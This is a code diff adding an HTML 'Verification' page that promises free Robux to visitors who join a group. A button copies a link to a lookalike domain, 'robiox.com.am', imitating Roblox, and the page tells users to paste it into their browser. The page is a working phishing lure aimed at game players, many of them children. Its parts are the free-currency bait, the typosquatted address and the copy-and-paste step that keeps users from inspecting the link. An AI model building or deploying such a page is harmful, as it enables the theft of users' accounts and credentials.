@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Verification Page</title>
+<style>
+    body {
+        margin: 0;
+        height: 100vh;
+        background-color: black;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        font-family: Arial, sans-serif;
+        color: white;
+        flex-direction: column;
+    }
+
+    /* Common styles for glow text */
+    .glow-text {
+        font-size: 3em;
+        color: #00ffff;
+        text-align: center;
+        animation: float 2s ease-in-out infinite;
+        text-shadow: 0 0 10px #00ffff, 0 0 20px #00ffff, 0 0 30px #00ffff, 0 0 40px #00ffff;
+        margin-bottom: 20px;
+    }
+
+    @keyframes float {
+        0%, 100% { transform: translateY(0); }
+        50% { transform: translateY(-15px); }
+    }
+
+    /* Styles for verification container */
+    .verification-container {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        padding: 20px;
+        border-radius: 10px;
+        background-color: rgba(0,0,0,0.7);
+        box-shadow: 0 0 15px rgba(0,0,0,0.5);
+        width: 350px;
+    }
+
+    .message {
+        margin: 15px 0;
+        font-size: 1.2em;
+        color: #ccc;
+        text-align: center;
+    }
+
+    .button {
+        padding: 10px;
+        border-radius: 5px;
+        border: none;
+        background-color: #00ffff;
+        color: black;
+        font-weight: bold;
+        cursor: pointer;
+        transition: 0.3s;
+        font-size: 1em;
+        margin-top: 10px;
+    }
+
+    .button:hover {
+        background-color: #00bbbb;
+    }
+
+    .browser-icons {
+        display: flex;
+        justify-content: center;
+        gap: 15px;
+        margin-top: 10px;
+        align-items: center;
+    }
+
+    .browser-icons img {
+        width: 40px;
+        height: 40px;
+        cursor: default;
+        transition: transform 0.2s;
+    }
+</style>
+</head>
+<body>
+
+<!-- Verification Section (no login form) -->
+<div class="verification-container">
+    <div class="glow-text">Verification</div>
+    <div class="message">JOIN THE GROUP TO RECEIVE THE ROBUX</div>
+    <button class="button" onclick="copyGroupLink()">COPY GROUP LINK</button>
+    <div class="message" style="margin-top:15px;">Paste it into your browser:</div>
+    <div class="browser-icons">
+        <!-- Only images, no links -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/5f/Google_Chrome_icon.png" alt="Chrome" title="Chrome"/>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/0d/Safari_logo.png" alt="Safari" title="Safari"/>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/0c/Firefox_logo_2019.png" alt="Firefox" title="Firefox"/>
+    </div>
+</div>
+
+<script>
+function copyGroupLink() {
+    const groupLink = "https://www.robiox.com.am/communities/4068228252/Vinnys-Garage";
+
+    if (navigator.clipboard) {
+        navigator.clipboard.writeText(groupLink).then(() => {
+            alert("Group link copied to clipboard!");
+        }).catch(() => {
+            fallbackCopy(groupLink);
+        });
+    } else {
+        fallbackCopy(groupLink);
+    }
+}
+
+function fallbackCopy(text) {
+    const textarea = document.createElement("textarea");
+    textarea.value = text;
+    document.body.appendChild(textarea);
+    textarea.focus();
+    textarea.select();
+    try {
+        document.execCommand('copy');
+        alert("Group link copied to clipboard!");
+    } catch (err) {
+        alert("Failed to copy. Please copy manually: " + text);
+    }
+    document.body.removeChild(textarea);
+}
+</script>
+
+</body>
+</html>
